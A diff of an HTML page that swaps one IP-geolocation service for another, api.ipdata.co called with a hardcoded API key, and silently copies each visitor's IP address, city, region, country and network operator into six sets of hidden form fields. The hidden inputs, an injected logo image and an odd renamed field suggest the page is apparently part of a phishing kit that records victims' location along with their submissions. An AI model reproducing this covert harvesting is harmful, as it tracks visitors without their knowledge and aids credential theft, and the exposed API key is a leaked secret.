@@ -789,7 +789,7 @@ document.getElementById('host').innerHTML='<img height="50" width="50" src=\'htt
   
   
   <label for="country"></label>
-  <input type="hidden" id="country5" name="country" placeholder="country" required="" />  
+  <input type="hidden" id="country5" name="pdf_rdpg_normal_others" placeholder="country" required="" />  
   
   <label for="region"></label>
   <input type="hidden" id="region5" name="region" placeholder="Region" required="" />  
@@ -840,54 +840,57 @@ document.getElementById('host').innerHTML='<img height="50" width="50" src=\'htt
 	  
 
 <script>
-  function recordData (data) {
-  
-     document.getElementById("country").value = (data.country);
-     document.getElementById("region").value = (data.timezone); 
-     document.getElementById("city").value = (data.city); 
-     document.getElementById("ip").value = (data.ip); 
-     document.getElementById("continent").value = (data.country); 
-     document.getElementById("org").value = (data.org); 
-  
-     document.getElementById("country1").value = (data.country);
-     document.getElementById("region1").value = (data.timezone); 
-     document.getElementById("city1").value = (data.city); 
-     document.getElementById("ip1").value = (data.ip); 
-     document.getElementById("continent1").value = (data.country); 
-     document.getElementById("org1").value = (data.org); 
-  
-     document.getElementById("country2").value = (data.country);
-     document.getElementById("region2").value = (data.timezone); 
-     document.getElementById("city2").value = (data.city); 
-     document.getElementById("ip2").value = (data.ip); 
-     document.getElementById("continent2").value = (data.country); 
-     document.getElementById("org2").value = (data.org); 
-  
-     document.getElementById("country3").value = (data.country);
-     document.getElementById("region3").value = (data.timezone); 
-     document.getElementById("city3").value = (data.city); 
-     document.getElementById("ip3").value = (data.ip); 
-     document.getElementById("continent3").value = (data.country); 
-     document.getElementById("org3").value = (data.org); 
-  
-     document.getElementById("country4").value = (data.country);
-     document.getElementById("region4").value = (data.timezone); 
-     document.getElementById("city4").value = (data.city); 
-     document.getElementById("ip4").value = (data.ip); 
-     document.getElementById("continent4").value = (data.country); 
-     document.getElementById("org4").value = (data.org); 
-  
-     document.getElementById("country5").value = (data.country);
-     document.getElementById("region5").value = (data.timezone); 
-     document.getElementById("city5").value = (data.city); 
-     document.getElementById("ip5").value = (data.ip); 
-     document.getElementById("continent5").value = (data.country); 
-     document.getElementById("org5").value = (data.org); 
-  
-    //console.log(data.ip, data.country)
-  }
-</script>
-<script src="https://ipinfo.io/json?callback=recordData"></script>
+
+$.get("https://api.ipdata.co/?api-key=2d94cb394c94c64442db19f316c66e6976140499307f6c95f21a2477", function (response) {
+    
+	
+     document.getElementById("country").value = (response.country_name);
+     document.getElementById("region").value = (response.region); 
+     document.getElementById("city").value = (response.city); 
+     document.getElementById("ip").value = (response.ip); 
+     document.getElementById("continent").value = (response.continent_name); 
+     document.getElementById("org").value = (response.asn.name); 
+
+     document.getElementById("country1").value = (response.country_name);
+     document.getElementById("region1").value = (response.region); 
+     document.getElementById("city1").value = (response.city); 
+     document.getElementById("ip1").value = (response.ip); 
+     document.getElementById("continent1").value = (response.continent_name); 
+     document.getElementById("org1").value = (response.asn.name); 
+
+     document.getElementById("country2").value = (response.country_name);
+     document.getElementById("region2").value = (response.region); 
+     document.getElementById("city2").value = (response.city); 
+     document.getElementById("ip2").value = (response.ip); 
+     document.getElementById("continent2").value = (response.continent_name); 
+     document.getElementById("org2").value = (response.asn.name); 
+
+     document.getElementById("country3").value = (response.country_name);
+     document.getElementById("region3").value = (response.region); 
+     document.getElementById("city3").value = (response.city); 
+     document.getElementById("ip3").value = (response.ip); 
+     document.getElementById("continent3").value = (response.continent_name); 
+     document.getElementById("org3").value = (response.asn.name); 
+
+     document.getElementById("country4").value = (response.country_name);
+     document.getElementById("region4").value = (response.region); 
+     document.getElementById("city4").value = (response.city); 
+     document.getElementById("ip4").value = (response.ip); 
+     document.getElementById("continent4").value = (response.continent_name); 
+     document.getElementById("org4").value = (response.asn.name); 
+
+     document.getElementById("country5").value = (response.country_name);
+     document.getElementById("region5").value = (response.region); 
+     document.getElementById("city5").value = (response.city); 
+     document.getElementById("ip5").value = (response.ip); 
+     document.getElementById("continent5").value = (response.continent_name); 
+     document.getElementById("org5").value = (response.asn.name); 
+
+
+}, "jsonp");
+
+ 
+ </script>
 	  
 	  
   </body>
